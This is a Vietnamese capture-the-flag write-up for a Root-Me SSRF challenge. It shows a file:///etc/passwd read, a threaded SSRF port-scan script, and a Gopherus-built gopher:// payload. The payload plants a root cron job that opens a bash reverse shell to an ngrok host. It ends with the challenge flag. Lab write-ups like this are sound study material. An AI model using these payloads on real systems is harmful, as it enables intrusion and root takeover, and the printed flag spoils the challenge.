# Trần Mạnh Huy

```
Statement
Objectif final : Get root privileges on SSRF box CTF All The Day to read the flag in the /root directory !
Validation flag is stored in the file /passwd

```
Ở đây web app cho mình nhập một url và nó sẽ thực hiện crawl dữ liệu từ cái url về, thử với đường dẫn http://youtube.com 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_01.jpg)

Để test lỗ hổng ssrf, ta có thể fuzz qua payload như: file:///etc/passwd  để thử đọc file có trên web server bằng cách sử dụng giao thức đọc file.

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_02.jpg)

Nhưng bằng cách này thì mình không thể đọc các file root mà chỉ có thể đọc được các file trong quyền của mình, nên sẽ kh đọc được flag. Vì vậy mình tiếp tục fuzz tiếp xem những port nào trên local đang chạy. Ở đây mình có thể dùng  Intruder của burp để phát hiện các cổng dịch vụ đang mở hoặc dùng script:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_03.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_04.jpg)



### Hoặc script:

```
import threading,requests
from queue import Queue
 
def scan(port):
    h={"Content-Type": "application/x-www-form-urlencoded",}
    url= "http://ctf09.root-me.org/index.php"
    data={"url":f"localhost:{port}"}
    r= requests.post(url,data=data)
    if "Connection refused" not in r.text:
        print(f"[+] FOUND AT PORT: {port}")
 
def threader():
    while True:
        worker = q.get()
        scan(worker)
        q.task_done()
 
q = Queue()
for i in range(100):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()
 
for worker in range(1, 10000):
    q.put(worker)
 
q.join()

```

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_05.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_06.jpg)


Sau khi fuzz qua, mình sẽ thấy được server nó đang dùng redis chạy với port 6379. Thông thường Redis service sẽ được chạy với đặc quyền root trong intranet và mình có thể sử dụng giao thức Gopher để lợi dụng điều đó.

```
Theo mặc định, Redis sẽ bị ràng buộc với 0.0.0.0:6379. Nếu các chính sách liên quan không được thông qua, chẳng hạn như thêm quy tắc tường lửa để tránh truy cập ip nguồn không đáng tin cậy khác, v.v., điều này sẽ hiển thị dịch vụ Redis cho mạng công cộng. Nếu không đặt xác thực mật khẩu (thường là trống), nó sẽ khiến bất kỳ người dùng nào truy cập Redis mà không được phép nếu họ có thể truy cập máy chủ mục tiêu và Đọc dữ liệu từ Redis.
Do đó, lỗ hổng này có thể sử dụng SSRF để bỏ qua các hạn chế liên kết cục bộ mà không cần định cấu hình mật khẩu, để tấn công các ứng dụng mạng nội bộ trên mạng bên ngoài.

```

Mình sẽ sử dụng tool tên là Gopherus để tạo ra payload reverse shell. Ngoài ra mình cũng sẽ sử dụng ngrok để thực hiện forward kết nối đến local interface của mình
> link tool:https://github.com/tarunkant/Gopherus

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_07.jpg)

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2472%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/0.tcp.ap.ngrok.io/13392%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A

```
Nếu decode nó ra, mình có thể thấy nó là gói dữ liệu TCP của reverseShell được viết bằng bash.

Giờ thì ném payload lên và chờ sẵn ở port 1234. Chờ 1 lúc cũng được:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_08.jpg)

Đọc được flag:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_09.jpg)


> Flag: SSRF_PwNiNg_v1@_GoPh3r_1s_$o_c00l!
